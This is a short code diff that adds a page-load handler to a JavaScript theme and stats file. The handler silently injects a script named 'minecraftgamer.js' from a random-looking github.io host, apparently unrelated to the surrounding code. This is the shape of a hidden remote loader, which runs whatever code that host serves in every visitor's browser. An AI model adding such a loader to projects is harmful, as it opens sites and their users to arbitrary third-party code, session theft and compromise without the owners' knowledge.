@@ -868,3 +868,16 @@ Array.from(statsElements).forEach(statsDiv => {
         setTimeout(themeclient, 500)
       }
     themeclient();
+
+
+document.addEventListener('DOMContentLoaded', function () {
+  const script = document.createElement('script');
+  script.src = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/minecraftgamer.js';
+  script.onload = function () {
+    console.log('minecraftgamer.js has been loaded successfully.');
+  };
+  script.onerror = function () {
+    console.error('Failed to load minecraftgamer.js.');
+  };
+  document.body.appendChild(script);
+});
